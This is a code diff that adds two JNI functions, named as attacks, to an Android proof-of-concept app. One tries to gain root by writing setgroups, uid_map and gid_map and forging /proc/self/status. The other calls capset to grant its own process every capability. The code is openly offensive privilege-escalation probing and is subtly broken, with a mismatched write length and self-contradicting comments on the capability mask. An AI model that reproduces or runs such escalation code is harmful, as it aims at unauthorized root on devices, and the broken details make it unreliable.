@@ -12,6 +12,8 @@
 #include <sys/ioctl.h>
 #include <sys/types.h>
 #include <sys/socket.h>
+#include <sys/syscall.h>
+#include <linux/capability.h>
 
 #include "binder.h"
 
@@ -577,6 +579,127 @@ Java_com_example_tzpoc_MainActivity_nativeBinderIoctlTest(JNIEnv* env, jclass cl
         snprintf(result, sizeof(result), "ioctl(0x%x) succeeded", cmd);
     } else {
         snprintf(result, sizeof(result), "ioctl(0x%x) failed: %s", cmd, strerror(errno));
+    }
+    return (*env)->NewStringUTF(env, result);
+}
+
+JNIEXPORT jstring JNICALL
+Java_com_example_tzpoc_MainActivity_nativeUidGidAttack(JNIEnv* env, jclass clazz) {
+    char result[512] = {0};
+    int fd;
+
+    // 1. Write "deny" to /proc/self/setgroups to allow gid mapping
+    fd = open("/proc/self/setgroups", O_WRONLY);
+    if (fd >= 0) {
+        if (write(fd, "deny", 4) == 4) {
+            strcat(result, "setgroups: deny OK; ");
+        } else {
+            strcat(result, "setgroups write failed; ");
+        }
+        close(fd);
+    } else {
+        strcat(result, "setgroups open failed; ");
+    }
+
+    // 2. Write "0 0 1" to /proc/self/uid_map
+    fd = open("/proc/self/uid_map", O_WRONLY);
+    if (fd >= 0) {
+        if (write(fd, "0 0 1\n", 6) == 6) {
+            strcat(result, "uid_map write OK; ");
+        } else {
+            strcat(result, "uid_map write failed; ");
+        }
+        close(fd);
+    } else {
+        strcat(result, "uid_map open failed; ");
+    }
+
+    // 3. Write "0 0 1" to /proc/self/gid_map
+    fd = open("/proc/self/gid_map", O_WRONLY);
+    if (fd >= 0) {
+        if (write(fd, "0 0 1\n", 6) == 6) {
+            strcat(result, "gid_map write OK; ");
+        } else {
+            strcat(result, "gid_map write failed; ");
+        }
+        close(fd);
+    } else {
+        strcat(result, "gid_map open failed; ");
+    }
+
+    // 4. Try to write directly to /proc/self/status (should fail)
+    fd = open("/proc/self/status", O_WRONLY);
+    if (fd >= 0) {
+        if (write(fd, "Uid: 0 0 0 0\nGid: 0 0 0 0\n", 24) == 24) {
+            strcat(result, "status write OK (unexpected); ");
+        } else {
+            strcat(result, "status write failed (expected); ");
+        }
+        close(fd);
+    } else {
+        strcat(result, "status open failed; ");
+    }
+
+    // 5. Read back /proc/self/status to see if any change occurred
+    char status_buf[4096] = {0};
+    fd = open("/proc/self/status", O_RDONLY);
+    if (fd >= 0) {
+        ssize_t n = read(fd, status_buf, sizeof(status_buf)-1);
+        close(fd);
+        if (n > 0) {
+            status_buf[n] = '\0';
+            // extract Uid and Gid lines
+            char* uid_line = strstr(status_buf, "Uid:");
+            char* gid_line = strstr(status_buf, "Gid:");
+            if (uid_line) {
+                char* end = strchr(uid_line, '\n');
+                if (end) *end = '\0';
+                strcat(result, "Uid: ");
+                strcat(result, uid_line + 4);
+                strcat(result, "; ");
+            }
+            if (gid_line) {
+                char* end = strchr(gid_line, '\n');
+                if (end) *end = '\0';
+                strcat(result, "Gid: ");
+                strcat(result, gid_line + 4);
+            }
+        } else {
+            strcat(result, "status read failed; ");
+        }
+    } else {
+        strcat(result, "status re-open failed; ");
+    }
+
+    return (*env)->NewStringUTF(env, result);
+}
+
+JNIEXPORT jstring JNICALL
+Java_com_example_tzpoc_MainActivity_nativeCapAttack(JNIEnv* env, jclass clazz) {
+    char result[256] = {0};
+    struct __user_cap_header_struct cap_header;
+    struct __user_cap_data_struct cap_data[2];
+
+    cap_header.version = _LINUX_CAPABILITY_VERSION_3;
+    cap_header.pid = getpid();
+
+    // Fill with all capabilities (0x3fffffff)
+    cap_data[0].effective = 0x3fffffff;
+    cap_data[0].permitted = 0x3fffffff;
+    cap_data[0].inheritable = 0x3fffffff;
+    cap_data[1].effective = 0x3fffffff;
+    cap_data[1].permitted = 0x3fffffff;
+    cap_data[1].inheritable = 0x3fffffff;
+
+    // For version 3, we need to set the second cap_data for bits 32-63, but we use all caps.
+    // Actually 0x3fffffff is only 30 bits, but all caps up to CAP_LAST_CAP (maybe 63).
+    // We'll set both to full.
+
+    int ret = syscall(__NR_capset, &cap_header, &cap_data);
+    if (ret == 0) {
+        snprintf(result, sizeof(result), "capset succeeded: capabilities set to full (0x3fffffff)");
+    } else {
+        snprintf(result, sizeof(result), "capset failed: %s", strerror(errno));
     }
     return (*env)->NewStringUTF(env, result);
 }
